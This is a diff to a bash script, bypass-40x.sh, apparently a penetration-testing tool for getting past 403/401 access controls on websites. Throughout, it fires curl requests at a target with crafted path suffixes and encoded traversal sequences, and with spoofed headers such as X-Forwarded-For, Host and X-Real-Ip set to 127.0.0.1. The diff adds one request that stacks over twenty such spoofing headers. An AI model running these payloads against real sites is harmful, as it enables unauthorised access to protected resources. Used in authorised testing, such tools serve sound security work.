@@ -7,7 +7,7 @@ then
 	echo "./bypass-40x.sh  [OPTIONS]  https://example.com /dir"
 	echo "./bypass-40x.sh  [OPTIONS]  https://example.com/dir1/dir2 /dir3/dir4"
 	echo "OPTIONS:"
-	echo "	-r Allow redirection if response is 3XX"
+	echo "  -r Allow redirection if response is 3XX"
 	exit
 fi
 # bash neet set RED,GREEN,YELLOW,CLEAR empty
@@ -67,11 +67,11 @@ DIR=${DIR#/}
 function curl_wapper(){
 	curl -k -s -o /dev/null --path-as-is -w "%{http_code}","%{size_download}" -H "$COOKIE" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
 }
-
+# https://www.baidu.com/dir1<payload>
 function payload_Suffux(){
 	# $1: full url with out "/" suffux
 	if [[ x$(echo ${1}|cut -d '/' -f4) != x ]]; then
-		# fix https://www.baidu.com*/
+		# fix https://www.baidu.com<payload>
 		output "${1}*" $(curl_wapper "${1}*")
 		output "${1};" $(curl_wapper "${1};")
 		output "${1}%3f" $(curl_wapper "${1}%3f")
@@ -123,12 +123,12 @@ function payload_Suffux(){
 	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/")
 	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f")
 }
-
+# https://www.baidu.com/dir1<payload>dir2
 function payload_Between(){
 	# $1 URL
 	# $2 DIR
 	if [[ x$(echo ${URL}|cut -d '/' -f4) != x ]]; then
-		# fix https://www.baidu.com;/
+		# fix https://www.baidu.com<payload>dir
 		output "${1};/${2}" $(curl_wapper "${1};/${2}")
 		output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}")
 	fi
@@ -150,10 +150,9 @@ function payload_Between(){
 	output "${upper_start}" $(curl_wapper "${upper_start}")
 	output "${lower_start}" $(curl_wapper "${lower_start}")
 }
-
+# https://www.baidu.com/dir1<payload>dir2<payload>
 function payload_Both(){
 	:
-	# statements
 }
 
 function payload_Header(){
@@ -184,6 +183,30 @@ function payload_Header(){
 	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL)
 	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL)
 	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL)
+	output "too many header one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
+													-H "Request-Uri: /$rewrite_url" \
+													-H "X-Forwarded: 127.0.0.1" \
+													-H "X-Forwarded-By: 127.0.0.1" \
+													-H "X-Forwarded-For-Original: 127.0.0.1" \
+													-H "X-Forwarded-Server: 127.0.0.1" \
+													-H "X-Forwarder-For: 127.0.0.1" \
+													-H "X-Forward-For: 127.0.0.1" \
+													-H "Base-Url: http://127.0.0.1/$rewrite_url" \
+													-H "Http-Url: http://127.0.0.1/$rewrite_url" \
+													-H "Proxy-Url: http://127.0.0.1/$rewrite_url" \
+													-H "Redirect: http://127.0.0.1/$rewrite_url" \
+													-H "Real-Ip: 127.0.0.1" \
+													-H "Referer: http://127.0.0.1/$rewrite_url" \
+													-H "Referrer: http://127.0.0.1/$rewrite_url" \
+													-H "Refferer: http://127.0.0.1/$rewrite_url" \
+													-H "Uri: /$rewrite_url" \
+													-H "Url: http://127.0.0.1/$rewrite_url" \
+													-H "X-Http-Destinationurl: 127.0.0.1" \
+													-H "X-Http-Host-Override: 127.0.0.1" \
+													-H "X-Original-Remote-Addr: 127.0.0.1" \
+													-H "X-Proxy-Url: http://127.0.0.1/$rewrite_url" \
+													-H "X-Real-Ip: 127.0.0.1" \
+													$FULL_URL)
 }
 
 function output(){
@@ -191,13 +214,13 @@ function output(){
 	# $2 status & content-length
 	STATUS=$(echo $2|cut -d',' -f 1)
 	LENGTH=$(echo $2|cut -d',' -f 2)
-    if [[ ${STATUS} =~ 2.. ]]; then
-    	echo -e "${GREEN}${2}${CLEAR} \t=> $1"
-    elif [[ ${STATUS} =~ 3.. ]]; then
-    	echo -e "${YELLOW}${2}${CLEAR} \t=> $1"
-    else
-    echo -e "${RED}${2}${CLEAR} \t=> $1"
-    fi
+	if [[ ${STATUS} =~ 2.. ]]; then
+		echo -e "${GREEN}${2}${CLEAR} \t=> $1"
+	elif [[ ${STATUS} =~ 3.. ]]; then
+		echo -e "${YELLOW}${2}${CLEAR} \t=> $1"
+	else
+		echo -e "${RED}${2}${CLEAR} \t=> $1"
+	fi
 }
 
 FULL_URL="${URL}/${DIR}"
